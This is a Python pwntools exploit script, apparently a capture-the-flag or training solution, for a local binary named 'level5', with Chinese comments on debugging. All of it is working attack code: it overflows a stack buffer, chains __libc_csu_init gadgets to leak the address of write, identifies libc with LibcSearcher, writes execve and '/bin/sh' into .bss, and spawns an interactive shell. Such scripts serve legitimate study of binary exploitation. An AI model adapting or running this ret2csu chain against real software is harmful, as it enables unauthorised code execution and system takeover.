#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import LibcSearcher
 
 
level5 = ELF('./level5')
sh = process('./level5')
 
#raw_input('debug?')#调试时打开
#gdb.attach(sh,"b *0x400562")
 
#context.log_level='debug'#调试时打开
write_got = level5.got['write']
main = level5.symbols['main']
read_got = level5.got['read']
bss_base = level5.bss()
 
csu_pop_addr = 0x400606
csu_call_addr = 0x4005f0
 
def csu(rbx,rbp,r12,r13,r14,r15,last):
	#call r12(r15,r14,r13),return to last
	payload = 'A'*(0x80+8)
	payload += p64(csu_pop_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(csu_call_addr)
	payload += 'A'*0x38+p64(last)
	sh.send(payload)
	sleep(1)
sh.recvuntil('Hello, World\n')
#write(1,write_got,8) and return to main
csu(0,1,write_got,1,write_got,8,main)
 
write_addr=u64(sh.recv()[0:8])
log.success('get write_addr:'+str(write_addr))
 
sh.recv(100,5)#接受5秒的数据，最多100个
log.success('start to search libc')
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr:' +str(execve_addr))
 
csu(0,1,read_got,0,bss_base,16,main)
sh.send(p64(execve_addr)+'/bin/sh\x00')
 
 
sh.recvuntil('Hello, World\n')
csu(0,1,bss_base,bss_base+8,0,0,main)
 
sh.interactive()
